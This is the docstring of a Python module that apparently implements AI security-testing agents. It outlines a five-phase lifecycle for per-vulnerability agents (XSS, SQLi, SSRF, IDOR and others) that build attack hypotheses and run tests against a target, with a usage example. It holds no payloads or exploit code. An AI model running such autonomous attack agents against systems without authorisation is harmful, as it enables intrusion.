"""
swarm_intelligence_engine.py — Specialized AI Security Agents

Each agent follows a 5-phase lifecycle:
  1. analyze_graph()       — identify relevant attack graph nodes
  2. generate_hypotheses() — produce ranked, context-aware attack hypotheses
  3. execute_tests()       — run targeted security tests via ToolRegistry
  4. report_findings()     — push findings to shared state + update graph
  5. learn_from_results()  — update per-agent memory (EMA) + persist to KB

Specialized agents: XSS, SQLi, SSRF, IDOR, Auth, BusinessLogic, Mobile, API

Usage:
    from swarm_intelligence_engine import create_agent, AgentType
    agent = create_agent(AgentType.XSS, tool_registry=reg, attack_graph=engine)
    findings = await agent.run(target="example.com", context={...})
"""

